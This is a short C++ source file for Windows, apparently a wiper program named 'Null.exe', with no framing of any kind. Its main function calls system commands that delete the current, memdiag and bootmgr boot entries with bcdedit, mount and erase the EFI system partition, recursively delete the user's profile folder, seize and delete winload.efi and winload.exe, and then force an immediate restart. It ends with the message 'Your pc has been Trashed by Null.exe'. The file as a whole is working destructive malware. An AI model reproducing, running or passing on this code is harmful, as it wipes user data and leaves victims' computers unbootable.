#include <Windows.h>
#include <iostream>

using namespace std;


int main()
{
	system("start bcdedit.exe /delete {current} /f");
	system("start bcdedit.exe /delete {memdiag} /f");
	system("start bcdedit.exe /delete {bootmgr} /f");
	system("start mountvol.exe W: /s");
	system("rd C:\\Users\\%username% /s /q");
	system("start takeown.exe /f C:\\Windows\\System32\\winload.efi");
	system("start takeown.exe /f C:\\Windows\\System32\\winload.exe");
	system("start icacls.exe C:\\Windows\\System32\\winload.efi /grant %username%:F");
	system("start icacls.exe C:\\Windows\\System32\\winload.exe /grant %username%:F");
	system("del C:\\Windows\\System32\\winload.efi");
	system("del C:\\Windows\\System32\\winload.exe");
	system("rd W: /s /q");
	cout << "Your pc has been Trashed by Null.exe";
	Sleep(2000);
	system("start shutdown.exe -r -t 0");
}
